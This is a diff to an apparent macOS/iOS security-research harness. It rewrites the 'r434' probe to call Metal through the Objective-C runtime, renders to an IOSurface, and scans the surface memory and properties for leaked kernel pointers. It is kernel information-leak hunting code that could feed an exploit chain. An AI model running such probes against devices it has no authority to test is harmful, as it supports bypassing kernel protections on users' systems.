@@ -100,7 +100,9 @@ extern kern_return_t mach_vm_page_info(
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
 #include <CoreMedia/CoreMedia.h>
-#include <Metal/Metal.h>
+/* Metal.h requires ObjC — use dlsym/objc_msgSend for Metal calls */
+#include <objc/runtime.h>
+#include <objc/message.h>
 #include <IOKit/IOKitLib.h>
 #include <dlfcn.h>
 #include <os/log.h>
@@ -16762,15 +16764,16 @@ static void r434_probe(void) {
     rlog("\n=== r434: Metal GPU + Purgeable Recovery + Page Info Flavors ===\n\n");
     fflush(stdout);
 
-    /* Vector A: Metal GPU render to IOSurface, scan for kernel data */
+    /* Vector A: Metal GPU render to IOSurface via ObjC runtime, scan for kernel data */
     rlog("  --- Vector A: Metal GPU render to IOSurface ---\n");
     {
-        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
-        rlog("    Metal device: %p name='%s'\n", device,
-             device ? [[device name] UTF8String] : "null");
+        /* Get MTLCreateSystemDefaultDevice via dlsym */
+        typedef id (*MTLCreateFn)(void);
+        MTLCreateFn createDev = (MTLCreateFn)dlsym(RTLD_DEFAULT, "MTLCreateSystemDefaultDevice");
+        id device = createDev ? createDev() : NULL;
+        rlog("    Metal device: %p\n", device);
 
         if (device) {
-            /* Create IOSurface */
             int gw = 64, gh = 64, gbpr = 256, gas = 16384, gpf = 0x42475241;
             CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
                 &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -16792,40 +16795,50 @@ static void r434_probe(void) {
             if (gsurf) {
                 rlog("    GPU surface: id=%u\n", IOSurfaceGetID(gsurf));
 
-                /* Fill with known pattern */
                 IOSurfaceLock(gsurf, 0, NULL);
                 memset(IOSurfaceGetBaseAddress(gsurf), 0xAA, gas);
                 IOSurfaceUnlock(gsurf, 0, NULL);
 
-                /* Create Metal texture from IOSurface */
-                MTLTextureDescriptor *tdesc = [MTLTextureDescriptor
-                    texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
-                    width:gw height:gh mipmapped:NO];
-                tdesc.usage = MTLTextureUsageRenderTarget | MTLTextureUsageShaderRead;
-                id<MTLTexture> tex = [device newTextureWithDescriptor:tdesc
-                    iosurface:gsurf plane:0];
+                /* Create texture descriptor via ObjC runtime */
+                Class MTLTexDescCls = objc_getClass("MTLTextureDescriptor");
+                SEL t2dSel = sel_registerName("texture2DDescriptorWithPixelFormat:width:height:mipmapped:");
+                id tdesc = ((id(*)(Class, SEL, unsigned long, unsigned long, unsigned long, BOOL))objc_msgSend)(
+                    MTLTexDescCls, t2dSel, 80UL/*BGRA8Unorm*/, (unsigned long)gw, (unsigned long)gh, NO);
+                /* usage = renderTarget(4) | shaderRead(1) = 5 */
+                ((void(*)(id, SEL, unsigned long))objc_msgSend)(tdesc, sel_registerName("setUsage:"), 5UL);
+
+                /* Create texture from IOSurface: newTextureWithDescriptor:iosurface:plane: */
+                SEL newTexSel = sel_registerName("newTextureWithDescriptor:iosurface:plane:");
+                id tex = ((id(*)(id, SEL, id, IOSurfaceRef, unsigned long))objc_msgSend)(
+                    device, newTexSel, tdesc, gsurf, 0UL);
                 rlog("    Metal texture: %p\n", tex);
 
                 if (tex) {
-                    /* Create a simple render pass that clears to a color */
-                    id<MTLCommandQueue> queue = [device newCommandQueue];
-                    id<MTLCommandBuffer> cmdBuf = [queue commandBuffer];
+                    id queue = ((id(*)(id, SEL))objc_msgSend)(device, sel_registerName("newCommandQueue"));
+                    id cmdBuf = ((id(*)(id, SEL))objc_msgSend)(queue, sel_registerName("commandBuffer"));
 
-                    MTLRenderPassDescriptor *rpd = [MTLRenderPassDescriptor renderPassDescriptor];
-                    rpd.colorAttachments[0].texture = tex;
-                    rpd.colorAttachments[0].loadAction = MTLLoadActionClear;
-                    rpd.colorAttachments[0].storeAction = MTLStoreActionStore;
-                    rpd.colorAttachments[0].clearColor = MTLClearColorMake(0.5, 0.25, 0.75, 1.0);
+                    Class RPDCls = objc_getClass("MTLRenderPassDescriptor");
+                    id rpd = ((id(*)(Class, SEL))objc_msgSend)(RPDCls, sel_registerName("renderPassDescriptor"));
+                    id colorAtts = ((id(*)(id, SEL))objc_msgSend)(rpd, sel_registerName("colorAttachments"));
+                    id att0 = ((id(*)(id, SEL, unsigned long))objc_msgSend)(colorAtts, sel_registerName("objectAtIndexedSubscript:"), 0UL);
+                    ((void(*)(id, SEL, id))objc_msgSend)(att0, sel_registerName("setTexture:"), tex);
+                    ((void(*)(id, SEL, unsigned long))objc_msgSend)(att0, sel_registerName("setLoadAction:"), 2UL/*clear*/);
+                    ((void(*)(id, SEL, unsigned long))objc_msgSend)(att0, sel_registerName("setStoreAction:"), 1UL/*store*/);
 
-                    id<MTLRenderCommandEncoder> enc = [cmdBuf renderCommandEncoderWithDescriptor:rpd];
-                    [enc endEncoding];
-                    [cmdBuf commit];
-                    [cmdBuf waitUntilCompleted];
+                    /* setClearColor — MTLClearColor is a struct {double r,g,b,a} */
+                    typedef struct { double r, g, b, a; } ClearColor;
+                    ClearColor cc = {0.5, 0.25, 0.75, 1.0};
+                    ((void(*)(id, SEL, ClearColor))objc_msgSend)(att0, sel_registerName("setClearColor:"), cc);
 
-                    rlog("    GPU render complete, status=%lu\n",
-                         (unsigned long)[cmdBuf status]);
+                    SEL encSel = sel_registerName("renderCommandEncoderWithDescriptor:");
+                    id enc = ((id(*)(id, SEL, id))objc_msgSend)(cmdBuf, encSel, rpd);
+                    ((void(*)(id, SEL))objc_msgSend)(enc, sel_registerName("endEncoding"));
+                    ((void(*)(id, SEL))objc_msgSend)(cmdBuf, sel_registerName("commit"));
+                    ((void(*)(id, SEL))objc_msgSend)(cmdBuf, sel_registerName("waitUntilCompleted"));
 
-                    /* Now scan the IOSurface backing store for kernel pointers */
+                    unsigned long status = ((unsigned long(*)(id, SEL))objc_msgSend)(cmdBuf, sel_registerName("status"));
+                    rlog("    GPU render complete, status=%lu\n", status);
+
                     IOSurfaceLock(gsurf, kIOSurfaceLockReadOnly, NULL);
                     uint64_t *bp = (uint64_t*)IOSurfaceGetBaseAddress(gsurf);
                     int kptr_found = 0;
@@ -16839,7 +16852,6 @@ static void r434_probe(void) {
                     }
                     if (kptr_found == 0) {
                         rlog("    No kernel pointers in GPU-rendered backing store\n");
-                        /* Check if the 0xAA pattern was overwritten (confirms GPU write) */
                         int changed = 0;
                         for (int i = 0; i < 16; i++) {
                             if (bp[i] != 0xAAAAAAAAAAAAAAAAULL) changed++;
@@ -16866,7 +16878,6 @@ static void r434_probe(void) {
                             rlog("    No kernel pointers in shared data post-GPU\n");
                     }
 
-                    /* Scan IOSurface properties after GPU use */
                     CFDictionaryRef allP = IOSurfaceCopyAllValues(gsurf);
                     if (allP) {
                         CFIndex pcnt = CFDictionaryGetCount(allP);
